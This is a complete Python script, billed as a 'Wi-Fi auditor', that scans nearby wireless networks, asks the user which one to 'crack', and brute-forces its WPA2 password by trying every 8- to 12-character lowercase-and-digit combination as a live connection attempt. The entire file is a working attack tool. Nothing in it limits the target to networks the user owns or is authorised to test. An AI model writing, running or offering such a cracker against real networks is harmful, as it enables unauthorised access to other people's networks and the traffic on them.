import pywifi
from pywifi import const
import time
import itertools
import string
import sys

def scan_networks():
    """Scans for nearby Wi-Fi networks and returns a list of unique SSIDs."""
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    
    print("[*] Scanning for nearby networks... (5 seconds)")
    iface.scan()
    time.sleep(5)
    
    results = iface.scan_results()
    # Remove duplicates and empty SSIDs
    ssids = sorted(list({network.ssid for network in results if network.ssid}))
    return ssids

def password_generator(min_len=8, max_len=12):
    """Generates all possible combinations of lowercase letters and numbers."""
    # Note: Adding uppercase or symbols makes the time-to-crack increase exponentially
    chars = string.ascii_lowercase + string.digits
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(chars, repeat=length):
            yield ''.join(combo)

def attempt_crack(target_ssid):
    """The main loop that generates and tests passwords against the target."""
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    
    start_time = time.time()
    attempts = 0
    
    print(f"\n[!] ATTACK STARTING ON: {target_ssid}")
    print("[*] Press Ctrl+C to stop the operation.\n")

    for password in password_generator(8, 12):
        attempts += 1
        elapsed = time.time() - start_time
        speed = attempts / elapsed if elapsed > 0 else 0
        
        # Live status update in the console
        sys.stdout.write(f"\r[Attempt: {attempts}] Testing: {password} | Speed: {speed:.2f} p/s | Time: {int(elapsed)}s")
        sys.stdout.flush()

        # Disconnect and prep for new attempt
        iface.disconnect()
        while iface.status() == const.IFACE_CONNECTED:
            time.sleep(0.1)
        
        iface.remove_all_network_profiles()

        # Build the connection profile
        profile = pywifi.Profile()
        profile.ssid = target_ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        # Attempt to connect
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)

        # Wait for router handshake (crucial timing)
        check_start = time.time()
        while time.time() - check_start < 3.5:
            if iface.status() == const.IFACE_CONNECTED:
                print(f"\n\n[SUCCESS] Password found: {password}")
                print(f"Total Attempts: {attempts} | Total Time: {elapsed:.2f}s")
                return True
            time.sleep(0.1)
             
    return False
 
def main():
    print("=== P0X-WIFI AUDITOR v1.0 ===") 
     
    # 1. Scan and List
    networks = scan_networks()
    if not networks: 
        print("[-] No networks found. Ensure Wi-Fi is enabled.")
        return
    else:
        print("\nAvailable Networks:") 
        for i, ssid in enumerate(networks): 
            print(f"[{i}] {ssid}")
 
        # 2. User Selection 
        try:   
            choice = int(input("\nSelect the ID of the network to crack: "))
            target_ssid = networks[choice]
        except (ValueError, IndexError): 
            return  
 
        # 3. Execution  
        try: 
            found = attempt_crack(target_ssid)
            if not found: 
                print("\n[-] Operation finished. No password was found.")
        except KeyboardInterrupt:
            print("\n\n[!] Operation stopped by user.")
 
if __name__ == "__main__":  
    main()